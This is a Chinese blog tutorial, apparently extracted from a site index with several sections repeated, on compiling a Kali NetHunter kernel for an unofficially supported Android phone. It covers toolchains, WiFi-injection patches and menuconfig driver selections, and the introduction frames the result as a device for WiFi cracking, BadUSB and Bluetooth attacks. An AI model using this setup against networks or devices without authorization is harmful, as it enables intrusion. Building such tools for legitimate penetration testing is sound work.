黑客行走江湖，哪儿能没有些趁手的兵器装备呢？ 相信很多人都曾梦想过拥有一台黑客专属手机，走到哪儿黑到哪儿。那么现实中这样的手机存在吗？答案是肯定的！NetHunter就能满足你所有的需求！ Kali Linux NetHunter是由Offensive-Security团队打造的基于Android平台的渗透测试环境。 通过使用Kali Linux NetHunter我们可以使用诸如外接无线网卡破解WiFi，模拟BadUSB设备进行HID攻击，外接USB蓝牙适配器进行蓝牙攻击……等各种近源渗透活动。 在Kali Linux NetHunter官网我们可以查阅官方支持的设备型号列表。 1.0.1 对读者的要求如果你会玩安卓刷机且手机型号恰好被官方支持，那么直接按照官方教程一步步来就好。 如果很不幸你的手机不被官方所支持但你会玩Linux且懂一些安卓开发以及C语言方面的知识想给自己的手机适配NetHunter，那么本篇教程就带你如何给一台不被官方支持的手机适配Kali NetHunter。 1.0.2 开始前的准备· 一台能解锁BootLoader且内核源码开源的安卓手机 · 一台高性能x86_64 PC 1.0.3 内核源码的选择一般来说，手机厂商开源的内核源码代码质量参差不齐（一言难尽），如果我们要选择自己适配NetHunter的话最好选择知名第三方开发者Fork的源码进行编译。 比较知名的有： · LineageOS · PixelExperience · crDroid · MoKee · Havoc-OS · Arter97 …等，这里不再一一列举。 1.0.4 交叉编译工具链的选择对于较老版本的内核（3.18.x以下）的一般是使用Google GCC4.9 对于较新版本的内核（4.4.x以上）的建议使用Clang来编译 对于Google gcc编译器，使用以下命令下载 64位： git clone https://mirrors.bfsu.edu.cn/git/AOSP/platform/prebuilts/gcc/linux-x86/aarch64/aarch64-linux-android-4.9 -b android-10.0.0_r32 --depth=1 32位： git clone https://mirrors.bfsu.edu.cn/git/AOSP/platform/prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.9 -b android-10.0.0_r32 --depth=1 对于Clang编译器，使用以下命令下载 Google官方Clang： git clone https://mirrors.bfsu.edu.cn/git/AOSP/platform/prebuilts/clang/host/linux-x86 --depth=1 Proton-clang: git clone https://github.com/kdrag0n/proton-clang.git --depth=1 1.0.5 如何查找自己手机的内核源码对于已经开源内核源码的手机来说，一般只需要在GitHub上搜索关键字就能找到适合你的内核源码 一般搜索的关键字为android_kernel_\u003c设备厂商名\u003e_\u003c设备CPU代号名\u003e 或者kernel_\u003c设备厂商名\u003e_\u003c设备CPU代号\u003e 又或者kernel_\u003c设备厂商名\u003e_\u003c设备代号\u003e 举个例子来说，我的设备是小米Redmi 4X，设备厂商是xiaomi，CPU代号是MSM8937，设备代号是santoni那么就可以在GitHub上搜索关键字android_kernel_xiaomi_msm8937或者kernel_xiaomi_santoni或者kernel_xiaomi_msm8937来找对应设备的内核源码。 这里还要注意的一点是所选取的内核源码尽量要与当前手机所使用的ROM Android版本对应，比如如果手机所使用的ROM是LineageOS的那就去找LineageOS所对应的内核源码，且分支也要一一对应。 当然你也可以选择在XDA论坛寻找其他第三方优秀作者提供的内核源码。 ","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:1:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#如何查找自己手机的内核源码"},{"categories":["kali"],"content":" 2 0x01 环境准备我这里使用VMware虚拟机安装Kali Linux系统来进行演示 Kali Linux最新镜像 下载链接 VMware Workstation Pro虚拟机 下载链接 ADB-FASTBOOT工具 for Linux 下载链接 ","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:2:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#0x01-环境准备"},{"categories":["kali"],"content":" 3 0x02 系统设置 3.0.6 设置更新源 echo \"deb https://mirrors.bfsu.edu.cn/kali kali-rolling main non-free contrib\" \u003e /etc/apt/sources.list 3.0.7 更新系统 apt update \u0026\u0026 apt upgrade -y \u0026\u0026 apt full-upgrade -y \u0026\u0026 reboot ","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:3:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#0x02-系统设置"},{"categories":["kali"],"content":" 3 0x02 系统设置 3.0.6 设置更新源 echo \"deb https://mirrors.bfsu.edu.cn/kali kali-rolling main non-free contrib\" \u003e /etc/apt/sources.list 3.0.7 更新系统 apt update \u0026\u0026 apt upgrade -y \u0026\u0026 apt full-upgrade -y \u0026\u0026 reboot ","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:3:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#设置更新源"},{"categories":["kali"],"content":" 3 0x02 系统设置 3.0.6 设置更新源 echo \"deb https://mirrors.bfsu.edu.cn/kali kali-rolling main non-free contrib\" \u003e /etc/apt/sources.list 3.0.7 更新系统 apt update \u0026\u0026 apt upgrade -y \u0026\u0026 apt full-upgrade -y \u0026\u0026 reboot ","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:3:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#更新系统"},{"categories":["kali"],"content":" 4 0x03 安装编译依赖 apt install -y curl wget vim git ccache automake flex lzop bison gperf \\ build-essential zip zlib1g-dev g++-multilib libxml2-utils bzip2 libbz2-dev \\ libbz2-1.0 libghc-bzlib-dev squashfs-tools pngcrush schedtool dpkg-dev \\ liblz4-tool make optipng maven libssl-dev pwgen libswitch-perl \\ policycoreutils minicom libxml-sax-base-perl libxml-simple-perl bc \\ libc6-dev-i386 lib32ncurses5-dev x11proto-core-dev libx11-dev lib32z-dev \\ libgl1-mesa-dev xsltproc unzip device-tree-compiler kmod python3 python3-pip ","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:4:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#0x03-安装编译依赖"},{"categories":["kali"],"content":" 5 0x04 下载交叉编译工具链 git clone https://github.com/kdrag0n/proton-clang.git /root/proton-clang --depth=1 ","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:5:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#0x04-下载交叉编译工具链"},{"categories":["kali"],"content":" 6 0x05 下载内核源码 git clone https://github.com/crdroidandroid/android_kernel_xiaomi_msm8937.git cd android_kernel_xiaomi_msm8937 ","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:6:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#0x05-下载内核源码"},{"categories":["kali"],"content":" 7 0x06 编译内核 7.0.8 设置环境变量 export ARCH=arm64 export SUBARCH=arm64 export KBUILD_BUILD_HOST=kali export KBUILD_BUILD_USER=root export LOCALVERSION=-NetHunter export PATH=\"/root/proton-clang/bin:$PATH\" mkdir out args=\"-j$(nproc --all) \\ ARCH=arm64 \\ SUBARCH=arm64 \\ O=out \\ CC=clang \\ CROSS_COMPILE=aarch64-linux-gnu- \\ CROSS_COMPILE_ARM32=arm-linux-gnueabi- \\ CLANG_TRIPLE=aarch64-linux-gnu- \\ AR=llvm-ar \\ NM=llvm-nm \\ OBJCOPY=llvm-objcopy \\ OBJDUMP=llvm-objdump \\ STRIP=llvm-strip \" 7.0.9 打入补丁这里根据你的内核版本选择对应内核版本的补丁(patches) 我这里内核是4.9所以选择4.9内核的补丁 git clone https://gitlab.com/kalilinux/nethunter/build-scripts/kali-nethunter-kernel.git patch -p1 \u003c kali-nethunter-kernel/patches/4.09/add-wifi-injection-4.14.patch patch -p1 \u003c kali-nethunter-kernel/patches/4.09/fix-ath9k-naming-conflict.patch 7.0.10 生成defconfig make ${args} mrproper make ${args} santoni_treble_defconfig 7.0.11 图形化配置内核选项以下内容不同版本内核可能会有所不同，以实际情况为准！ make ${args} menuconfig menuconfig 首先进入\"Gerenal Setup\" 选择到\"Local version - append to kernel release\" 清空里面所有内容 然后取消勾选\"Automatically append version information to the version string\" 接着选中\"Default hostname\"，输入\"kali\" 接着勾选\"System V IPC\" 然后返回上一级菜单 如图所示 general 接着进入到\"Enable loadable module support\" 勾选以下几个选项: \"loadable module support\" \"Forced module loading\" \"Modules unloading\" \"Forced module unloading\" \"Module versioning support\" 然后返回上一级菜单 如图所示 module 接着进入到\"Networking support\" -\u003e \"Bluetooth subsystem support\" -\u003e \"Bluetooth drivers support\" 勾选以下几个选项: \"HCI USB driver\" \"Broadcom protocol support\" \"Realtek protocol support\" \"HCI UART driver\" \"HCI BCM203x USB driver\" \"HCI BPA10x USB driver\" \"HCI BlueFRITZ! USB driver\" 然后返回上一级菜单 如图所示 bluetooth-driver 勾选以下几个选项： \"Bluetooth Classic (BR/EDR) features\" \"RFCOMM protocol support\" \"RFCOMM TTY support\" \"BNEP protocol support\" \"HIDP protocol support\" \"Bluetooth Low Energy (LE) features\" 然后返回上一级菜单 如图所示 bluetooth 进入到\"Wireless\" 勾选以下几个选项： \"nl80211 testmode command\" \"use statically compiled regulatory rules database\" \"cfg80211 wireless extensions compatibility\" \"Generic IEEE 802.11 Networking Stack (mac80211)\" \"Enable mac80211 mesh networking (pre-802.11s) support\" 然后返回上一级菜单 如图所示 wireless 接着进入到\"Device Drivers\" -\u003e \"Network device support\" -\u003e \"USB Network Adapters\" 勾选以下几个选项： \"USB RTL8150 based ethernet device support\" \"Realtek RTL8152/RTL8153 Based USB Ethernet Adapters\" \"ASIX AX88xxx Based USB 2.0 Ethernet Adapters\" \"ASIX AX88179/178A USB 3.0/2.0 to Gigabit Ethernet\". 然后返回上一级菜单 如图所示 usb_net 接着进入到\"Wireless LAN\" 勾选以下几个选项： \"Atheros/Qualcomm devices\" \"Atheros HTC based wireless cards support\" \"Linux Community AR9170 802.11n USB support\" \"Atheros mobile chipsets support\" \"Atheros ath6kl USB support\" \"MediaTek devices\" \"MediaTek MT7601U (USB) support\" \"Ralink devices\" \"Ralink driver support\" \"Realtek devices\" \"Realtek 8187 and 8187B USB support\" \"Realtek rtlwifi family of devices\" \"RTL8723AU/RTL8188[CR]U/RTL819[12]CU (mac80211) support\" \"Include support for untested Realtek 8xxx USB devices (EXPERIMENTAL)\" \"ZyDAS devices\" \"USB ZD1201 based Wireless device support\" \"ZyDAS ZD1211/ZD1211B USB-wireless support\" \"Wireless RNDIS USB support\" 在\"Ralink driver support\"中勾选以下几个选项： \"Ralink rt2500 (USB) support\" \"Ralink rt2501/rt73 (USB) support\" \"Ralink rt27xx/rt28xx/rt30xx (USB) support\" \"rt2800usb - Include support for rt33xx devices\" \"rt2800usb - Include support for rt35xx devices (EXPERIMENTAL)\" \"rt2800usb - Include support for rt3573 devices (EXPERIMENTAL)\" \"rt2800usb - Include support for rt53xx devices (EXPERIMENTAL)\" \"rt2800usb - Include support for rt55xx devices (EXPERIMENTAL)\" \"rt2800usb - Include support for unknown (USB) devices\" 在\"Realtek rtlwifi family of devices\" 中勾选 \"Realtek RTL8192CU/RTL8188CU USB Wireless Network Adapter\" 然后返回主菜单 如图所示 Atheros MediaTek Ralink Realtek ZyDAS 进入到\"Device Drivers\" -\u003e \"Multimedia support\" 勾选： \"Digital TV support\" \"Software defined radio support\" \"Media USB Adapters\" 在\"Media USB Adapters\"中 勾选： \"Airspy\" \"HackRF\" \"Mirics MSi 2500\" 然后拉到最下面，取消勾选 \"Autoselect ancillary drivers (tuners, sen","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:7:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#0x06-编译内核"},{"categories":["kali"],"content":" 7 0x06 编译内核 7.0.8 设置环境变量 export ARCH=arm64 export SUBARCH=arm64 export KBUILD_BUILD_HOST=kali export KBUILD_BUILD_USER=root export LOCALVERSION=-NetHunter export PATH=\"/root/proton-clang/bin:$PATH\" mkdir out args=\"-j$(nproc --all) \\ ARCH=arm64 \\ SUBARCH=arm64 \\ O=out \\ CC=clang \\ CROSS_COMPILE=aarch64-linux-gnu- \\ CROSS_COMPILE_ARM32=arm-linux-gnueabi- \\ CLANG_TRIPLE=aarch64-linux-gnu- \\ AR=llvm-ar \\ NM=llvm-nm \\ OBJCOPY=llvm-objcopy \\ OBJDUMP=llvm-objdump \\ STRIP=llvm-strip \" 7.0.9 打入补丁这里根据你的内核版本选择对应内核版本的补丁(patches) 我这里内核是4.9所以选择4.9内核的补丁 git clone https://gitlab.com/kalilinux/nethunter/build-scripts/kali-nethunter-kernel.git patch -p1 \u003c kali-nethunter-kernel/patches/4.09/add-wifi-injection-4.14.patch patch -p1 \u003c kali-nethunter-kernel/patches/4.09/fix-ath9k-naming-conflict.patch 7.0.10 生成defconfig make ${args} mrproper make ${args} santoni_treble_defconfig 7.0.11 图形化配置内核选项以下内容不同版本内核可能会有所不同，以实际情况为准！ make ${args} menuconfig menuconfig 首先进入\"Gerenal Setup\" 选择到\"Local version - append to kernel release\" 清空里面所有内容 然后取消勾选\"Automatically append version information to the version string\" 接着选中\"Default hostname\"，输入\"kali\" 接着勾选\"System V IPC\" 然后返回上一级菜单 如图所示 general 接着进入到\"Enable loadable module support\" 勾选以下几个选项: \"loadable module support\" \"Forced module loading\" \"Modules unloading\" \"Forced module unloading\" \"Module versioning support\" 然后返回上一级菜单 如图所示 module 接着进入到\"Networking support\" -\u003e \"Bluetooth subsystem support\" -\u003e \"Bluetooth drivers support\" 勾选以下几个选项: \"HCI USB driver\" \"Broadcom protocol support\" \"Realtek protocol support\" \"HCI UART driver\" \"HCI BCM203x USB driver\" \"HCI BPA10x USB driver\" \"HCI BlueFRITZ! USB driver\" 然后返回上一级菜单 如图所示 bluetooth-driver 勾选以下几个选项： \"Bluetooth Classic (BR/EDR) features\" \"RFCOMM protocol support\" \"RFCOMM TTY support\" \"BNEP protocol support\" \"HIDP protocol support\" \"Bluetooth Low Energy (LE) features\" 然后返回上一级菜单 如图所示 bluetooth 进入到\"Wireless\" 勾选以下几个选项： \"nl80211 testmode command\" \"use statically compiled regulatory rules database\" \"cfg80211 wireless extensions compatibility\" \"Generic IEEE 802.11 Networking Stack (mac80211)\" \"Enable mac80211 mesh networking (pre-802.11s) support\" 然后返回上一级菜单 如图所示 wireless 接着进入到\"Device Drivers\" -\u003e \"Network device support\" -\u003e \"USB Network Adapters\" 勾选以下几个选项： \"USB RTL8150 based ethernet device support\" \"Realtek RTL8152/RTL8153 Based USB Ethernet Adapters\" \"ASIX AX88xxx Based USB 2.0 Ethernet Adapters\" \"ASIX AX88179/178A USB 3.0/2.0 to Gigabit Ethernet\". 然后返回上一级菜单 如图所示 usb_net 接着进入到\"Wireless LAN\" 勾选以下几个选项： \"Atheros/Qualcomm devices\" \"Atheros HTC based wireless cards support\" \"Linux Community AR9170 802.11n USB support\" \"Atheros mobile chipsets support\" \"Atheros ath6kl USB support\" \"MediaTek devices\" \"MediaTek MT7601U (USB) support\" \"Ralink devices\" \"Ralink driver support\" \"Realtek devices\" \"Realtek 8187 and 8187B USB support\" \"Realtek rtlwifi family of devices\" \"RTL8723AU/RTL8188[CR]U/RTL819[12]CU (mac80211) support\" \"Include support for untested Realtek 8xxx USB devices (EXPERIMENTAL)\" \"ZyDAS devices\" \"USB ZD1201 based Wireless device support\" \"ZyDAS ZD1211/ZD1211B USB-wireless support\" \"Wireless RNDIS USB support\" 在\"Ralink driver support\"中勾选以下几个选项： \"Ralink rt2500 (USB) support\" \"Ralink rt2501/rt73 (USB) support\" \"Ralink rt27xx/rt28xx/rt30xx (USB) support\" \"rt2800usb - Include support for rt33xx devices\" \"rt2800usb - Include support for rt35xx devices (EXPERIMENTAL)\" \"rt2800usb - Include support for rt3573 devices (EXPERIMENTAL)\" \"rt2800usb - Include support for rt53xx devices (EXPERIMENTAL)\" \"rt2800usb - Include support for rt55xx devices (EXPERIMENTAL)\" \"rt2800usb - Include support for unknown (USB) devices\" 在\"Realtek rtlwifi family of devices\" 中勾选 \"Realtek RTL8192CU/RTL8188CU USB Wireless Network Adapter\" 然后返回主菜单 如图所示 Atheros MediaTek Ralink Realtek ZyDAS 进入到\"Device Drivers\" -\u003e \"Multimedia support\" 勾选： \"Digital TV support\" \"Software defined radio support\" \"Media USB Adapters\" 在\"Media USB Adapters\"中 勾选： \"Airspy\" \"HackRF\" \"Mirics MSi 2500\" 然后拉到最下面，取消勾选 \"Autoselect ancillary drivers (tuners, sen","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:7:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#设置环境变量"},{"categories":["kali"],"content":" 7 0x06 编译内核 7.0.8 设置环境变量 export ARCH=arm64 export SUBARCH=arm64 export KBUILD_BUILD_HOST=kali export KBUILD_BUILD_USER=root export LOCALVERSION=-NetHunter export PATH=\"/root/proton-clang/bin:$PATH\" mkdir out args=\"-j$(nproc --all) \\ ARCH=arm64 \\ SUBARCH=arm64 \\ O=out \\ CC=clang \\ CROSS_COMPILE=aarch64-linux-gnu- \\ CROSS_COMPILE_ARM32=arm-linux-gnueabi- \\ CLANG_TRIPLE=aarch64-linux-gnu- \\ AR=llvm-ar \\ NM=llvm-nm \\ OBJCOPY=llvm-objcopy \\ OBJDUMP=llvm-objdump \\ STRIP=llvm-strip \" 7.0.9 打入补丁这里根据你的内核版本选择对应内核版本的补丁(patches) 我这里内核是4.9所以选择4.9内核的补丁 git clone https://gitlab.com/kalilinux/nethunter/build-scripts/kali-nethunter-kernel.git patch -p1 \u003c kali-nethunter-kernel/patches/4.09/add-wifi-injection-4.14.patch patch -p1 \u003c kali-nethunter-kernel/patches/4.09/fix-ath9k-naming-conflict.patch 7.0.10 生成defconfig make ${args} mrproper make ${args} santoni_treble_defconfig 7.0.11 图形化配置内核选项以下内容不同版本内核可能会有所不同，以实际情况为准！ make ${args} menuconfig menuconfig 首先进入\"Gerenal Setup\" 选择到\"Local version - append to kernel release\" 清空里面所有内容 然后取消勾选\"Automatically append version information to the version string\" 接着选中\"Default hostname\"，输入\"kali\" 接着勾选\"System V IPC\" 然后返回上一级菜单 如图所示 general 接着进入到\"Enable loadable module support\" 勾选以下几个选项: \"loadable module support\" \"Forced module loading\" \"Modules unloading\" \"Forced module unloading\" \"Module versioning support\" 然后返回上一级菜单 如图所示 module 接着进入到\"Networking support\" -\u003e \"Bluetooth subsystem support\" -\u003e \"Bluetooth drivers support\" 勾选以下几个选项: \"HCI USB driver\" \"Broadcom protocol support\" \"Realtek protocol support\" \"HCI UART driver\" \"HCI BCM203x USB driver\" \"HCI BPA10x USB driver\" \"HCI BlueFRITZ! USB driver\" 然后返回上一级菜单 如图所示 bluetooth-driver 勾选以下几个选项： \"Bluetooth Classic (BR/EDR) features\" \"RFCOMM protocol support\" \"RFCOMM TTY support\" \"BNEP protocol support\" \"HIDP protocol support\" \"Bluetooth Low Energy (LE) features\" 然后返回上一级菜单 如图所示 bluetooth 进入到\"Wireless\" 勾选以下几个选项： \"nl80211 testmode command\" \"use statically compiled regulatory rules database\" \"cfg80211 wireless extensions compatibility\" \"Generic IEEE 802.11 Networking Stack (mac80211)\" \"Enable mac80211 mesh networking (pre-802.11s) support\" 然后返回上一级菜单 如图所示 wireless 接着进入到\"Device Drivers\" -\u003e \"Network device support\" -\u003e \"USB Network Adapters\" 勾选以下几个选项： \"USB RTL8150 based ethernet device support\" \"Realtek RTL8152/RTL8153 Based USB Ethernet Adapters\" \"ASIX AX88xxx Based USB 2.0 Ethernet Adapters\" \"ASIX AX88179/178A USB 3.0/2.0 to Gigabit Ethernet\". 然后返回上一级菜单 如图所示 usb_net 接着进入到\"Wireless LAN\" 勾选以下几个选项： \"Atheros/Qualcomm devices\" \"Atheros HTC based wireless cards support\" \"Linux Community AR9170 802.11n USB support\" \"Atheros mobile chipsets support\" \"Atheros ath6kl USB support\" \"MediaTek devices\" \"MediaTek MT7601U (USB) support\" \"Ralink devices\" \"Ralink driver support\" \"Realtek devices\" \"Realtek 8187 and 8187B USB support\" \"Realtek rtlwifi family of devices\" \"RTL8723AU/RTL8188[CR]U/RTL819[12]CU (mac80211) support\" \"Include support for untested Realtek 8xxx USB devices (EXPERIMENTAL)\" \"ZyDAS devices\" \"USB ZD1201 based Wireless device support\" \"ZyDAS ZD1211/ZD1211B USB-wireless support\" \"Wireless RNDIS USB support\" 在\"Ralink driver support\"中勾选以下几个选项： \"Ralink rt2500 (USB) support\" \"Ralink rt2501/rt73 (USB) support\" \"Ralink rt27xx/rt28xx/rt30xx (USB) support\" \"rt2800usb - Include support for rt33xx devices\" \"rt2800usb - Include support for rt35xx devices (EXPERIMENTAL)\" \"rt2800usb - Include support for rt3573 devices (EXPERIMENTAL)\" \"rt2800usb - Include support for rt53xx devices (EXPERIMENTAL)\" \"rt2800usb - Include support for rt55xx devices (EXPERIMENTAL)\" \"rt2800usb - Include support for unknown (USB) devices\" 在\"Realtek rtlwifi family of devices\" 中勾选 \"Realtek RTL8192CU/RTL8188CU USB Wireless Network Adapter\" 然后返回主菜单 如图所示 Atheros MediaTek Ralink Realtek ZyDAS 进入到\"Device Drivers\" -\u003e \"Multimedia support\" 勾选： \"Digital TV support\" \"Software defined radio support\" \"Media USB Adapters\" 在\"Media USB Adapters\"中 勾选： \"Airspy\" \"HackRF\" \"Mirics MSi 2500\" 然后拉到最下面，取消勾选 \"Autoselect ancillary drivers (tuners, sen","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:7:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#打入补丁"},{"categories":["kali"],"content":" 7 0x06 编译内核 7.0.8 设置环境变量 export ARCH=arm64 export SUBARCH=arm64 export KBUILD_BUILD_HOST=kali export KBUILD_BUILD_USER=root export LOCALVERSION=-NetHunter export PATH=\"/root/proton-clang/bin:$PATH\" mkdir out args=\"-j$(nproc --all) \\ ARCH=arm64 \\ SUBARCH=arm64 \\ O=out \\ CC=clang \\ CROSS_COMPILE=aarch64-linux-gnu- \\ CROSS_COMPILE_ARM32=arm-linux-gnueabi- \\ CLANG_TRIPLE=aarch64-linux-gnu- \\ AR=llvm-ar \\ NM=llvm-nm \\ OBJCOPY=llvm-objcopy \\ OBJDUMP=llvm-objdump \\ STRIP=llvm-strip \" 7.0.9 打入补丁这里根据你的内核版本选择对应内核版本的补丁(patches) 我这里内核是4.9所以选择4.9内核的补丁 git clone https://gitlab.com/kalilinux/nethunter/build-scripts/kali-nethunter-kernel.git patch -p1 \u003c kali-nethunter-kernel/patches/4.09/add-wifi-injection-4.14.patch patch -p1 \u003c kali-nethunter-kernel/patches/4.09/fix-ath9k-naming-conflict.patch 7.0.10 生成defconfig make ${args} mrproper make ${args} santoni_treble_defconfig 7.0.11 图形化配置内核选项以下内容不同版本内核可能会有所不同，以实际情况为准！ make ${args} menuconfig menuconfig 首先进入\"Gerenal Setup\" 选择到\"Local version - append to kernel release\" 清空里面所有内容 然后取消勾选\"Automatically append version information to the version string\" 接着选中\"Default hostname\"，输入\"kali\" 接着勾选\"System V IPC\" 然后返回上一级菜单 如图所示 general 接着进入到\"Enable loadable module support\" 勾选以下几个选项: \"loadable module support\" \"Forced module loading\" \"Modules unloading\" \"Forced module unloading\" \"Module versioning support\" 然后返回上一级菜单 如图所示 module 接着进入到\"Networking support\" -\u003e \"Bluetooth subsystem support\" -\u003e \"Bluetooth drivers support\" 勾选以下几个选项: \"HCI USB driver\" \"Broadcom protocol support\" \"Realtek protocol support\" \"HCI UART driver\" \"HCI BCM203x USB driver\" \"HCI BPA10x USB driver\" \"HCI BlueFRITZ! USB driver\" 然后返回上一级菜单 如图所示 bluetooth-driver 勾选以下几个选项： \"Bluetooth Classic (BR/EDR) features\" \"RFCOMM protocol support\" \"RFCOMM TTY support\" \"BNEP protocol support\" \"HIDP protocol support\" \"Bluetooth Low Energy (LE) features\" 然后返回上一级菜单 如图所示 bluetooth 进入到\"Wireless\" 勾选以下几个选项： \"nl80211 testmode command\" \"use statically compiled regulatory rules database\" \"cfg80211 wireless extensions compatibility\" \"Generic IEEE 802.11 Networking Stack (mac80211)\" \"Enable mac80211 mesh networking (pre-802.11s) support\" 然后返回上一级菜单 如图所示 wireless 接着进入到\"Device Drivers\" -\u003e \"Network device support\" -\u003e \"USB Network Adapters\" 勾选以下几个选项： \"USB RTL8150 based ethernet device support\" \"Realtek RTL8152/RTL8153 Based USB Ethernet Adapters\" \"ASIX AX88xxx Based USB 2.0 Ethernet Adapters\" \"ASIX AX88179/178A USB 3.0/2.0 to Gigabit Ethernet\". 然后返回上一级菜单 如图所示 usb_net 接着进入到\"Wireless LAN\" 勾选以下几个选项： \"Atheros/Qualcomm devices\" \"Atheros HTC based wireless cards support\" \"Linux Community AR9170 802.11n USB support\" \"Atheros mobile chipsets support\" \"Atheros ath6kl USB support\" \"MediaTek devices\" \"MediaTek MT7601U (USB) support\" \"Ralink devices\" \"Ralink driver support\" \"Realtek devices\" \"Realtek 8187 and 8187B USB support\" \"Realtek rtlwifi family of devices\" \"RTL8723AU/RTL8188[CR]U/RTL819[12]CU (mac80211) support\" \"Include support for untested Realtek 8xxx USB devices (EXPERIMENTAL)\" \"ZyDAS devices\" \"USB ZD1201 based Wireless device support\" \"ZyDAS ZD1211/ZD1211B USB-wireless support\" \"Wireless RNDIS USB support\" 在\"Ralink driver support\"中勾选以下几个选项： \"Ralink rt2500 (USB) support\" \"Ralink rt2501/rt73 (USB) support\" \"Ralink rt27xx/rt28xx/rt30xx (USB) support\" \"rt2800usb - Include support for rt33xx devices\" \"rt2800usb - Include support for rt35xx devices (EXPERIMENTAL)\" \"rt2800usb - Include support for rt3573 devices (EXPERIMENTAL)\" \"rt2800usb - Include support for rt53xx devices (EXPERIMENTAL)\" \"rt2800usb - Include support for rt55xx devices (EXPERIMENTAL)\" \"rt2800usb - Include support for unknown (USB) devices\" 在\"Realtek rtlwifi family of devices\" 中勾选 \"Realtek RTL8192CU/RTL8188CU USB Wireless Network Adapter\" 然后返回主菜单 如图所示 Atheros MediaTek Ralink Realtek ZyDAS 进入到\"Device Drivers\" -\u003e \"Multimedia support\" 勾选： \"Digital TV support\" \"Software defined radio support\" \"Media USB Adapters\" 在\"Media USB Adapters\"中 勾选： \"Airspy\" \"HackRF\" \"Mirics MSi 2500\" 然后拉到最下面，取消勾选 \"Autoselect ancillary drivers (tuners, sen","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:7:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#生成defconfig"},{"categories":["kali"],"content":" 7 0x06 编译内核 7.0.8 设置环境变量 export ARCH=arm64 export SUBARCH=arm64 export KBUILD_BUILD_HOST=kali export KBUILD_BUILD_USER=root export LOCALVERSION=-NetHunter export PATH=\"/root/proton-clang/bin:$PATH\" mkdir out args=\"-j$(nproc --all) \\ ARCH=arm64 \\ SUBARCH=arm64 \\ O=out \\ CC=clang \\ CROSS_COMPILE=aarch64-linux-gnu- \\ CROSS_COMPILE_ARM32=arm-linux-gnueabi- \\ CLANG_TRIPLE=aarch64-linux-gnu- \\ AR=llvm-ar \\ NM=llvm-nm \\ OBJCOPY=llvm-objcopy \\ OBJDUMP=llvm-objdump \\ STRIP=llvm-strip \" 7.0.9 打入补丁这里根据你的内核版本选择对应内核版本的补丁(patches) 我这里内核是4.9所以选择4.9内核的补丁 git clone https://gitlab.com/kalilinux/nethunter/build-scripts/kali-nethunter-kernel.git patch -p1 \u003c kali-nethunter-kernel/patches/4.09/add-wifi-injection-4.14.patch patch -p1 \u003c kali-nethunter-kernel/patches/4.09/fix-ath9k-naming-conflict.patch 7.0.10 生成defconfig make ${args} mrproper make ${args} santoni_treble_defconfig 7.0.11 图形化配置内核选项以下内容不同版本内核可能会有所不同，以实际情况为准！ make ${args} menuconfig menuconfig 首先进入\"Gerenal Setup\" 选择到\"Local version - append to kernel release\" 清空里面所有内容 然后取消勾选\"Automatically append version information to the version string\" 接着选中\"Default hostname\"，输入\"kali\" 接着勾选\"System V IPC\" 然后返回上一级菜单 如图所示 general 接着进入到\"Enable loadable module support\" 勾选以下几个选项: \"loadable module support\" \"Forced module loading\" \"Modules unloading\" \"Forced module unloading\" \"Module versioning support\" 然后返回上一级菜单 如图所示 module 接着进入到\"Networking support\" -\u003e \"Bluetooth subsystem support\" -\u003e \"Bluetooth drivers support\" 勾选以下几个选项: \"HCI USB driver\" \"Broadcom protocol support\" \"Realtek protocol support\" \"HCI UART driver\" \"HCI BCM203x USB driver\" \"HCI BPA10x USB driver\" \"HCI BlueFRITZ! USB driver\" 然后返回上一级菜单 如图所示 bluetooth-driver 勾选以下几个选项： \"Bluetooth Classic (BR/EDR) features\" \"RFCOMM protocol support\" \"RFCOMM TTY support\" \"BNEP protocol support\" \"HIDP protocol support\" \"Bluetooth Low Energy (LE) features\" 然后返回上一级菜单 如图所示 bluetooth 进入到\"Wireless\" 勾选以下几个选项： \"nl80211 testmode command\" \"use statically compiled regulatory rules database\" \"cfg80211 wireless extensions compatibility\" 